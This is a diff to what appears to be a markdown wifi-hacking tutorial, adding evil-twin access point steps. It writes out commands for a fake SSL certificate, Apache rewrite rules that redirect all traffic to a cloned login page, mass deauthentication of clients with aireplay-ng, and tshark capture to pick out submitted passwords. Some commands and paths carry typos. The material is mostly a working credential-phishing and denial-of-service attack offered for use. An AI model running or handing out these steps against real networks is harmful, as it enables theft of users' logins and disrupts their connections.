@@ -360,10 +360,47 @@ Set the IP for the adapter look at dnsmasq.conf
 ```
 ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
 ```
+
+Generating Fake SSL Certificate
+```
+oppenssl req -new -x509 -days 365 -out /root/downloads/fake-ap/cert.pem -keyout /root/Downloads/fake-ap/cert.key
+a2enmod ssl
+```
+
+Redirecting Requests To Captive Portal Login Page  
 start the apache with the fake login page
 ```
+leafpad /etc/apache2/ports.conf
+Listen 443
+
+leafpad /etc/apache2/sites-enabled/000-default.conf
+
+<VirtualHost *:80>
+    ErrorDocument 404 /
+</VirtualHost>
+
+<VirtualHost *:443>
+    SSLEngine On
+    SSLCertificateFile /root/downloads/fake-ap/cert.pem
+    SSLCertificateKeyFile /root/Downloads/fake-ap/cert.key
+</VirtualHost>
+
+<Directory "/var/wwww/html">
+    RewriteEngine On
+    RewriteBase /
+    RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+    RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+    
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^(.*)$ / [L,QSA]
+<Directory>
+
 service apache2 start
+or
+service apache2 restart
 ```
+
 - Deauth users to use the fake network with the cloned page.
 ```
 Terminal 1
@@ -372,8 +409,11 @@ Terminal 2
 aireplay-ng --deauth 10000000 -a (BSSID) mon0
 ```
 - Sniff the login info!
+```
+tshark -i wlan0 -w royal-wifi.cap
+open wireshark and search http and look for post request
+```
 
-<form method="post" action="/index.html"></form>
 
 ## Conclucion:
 no usar wep  
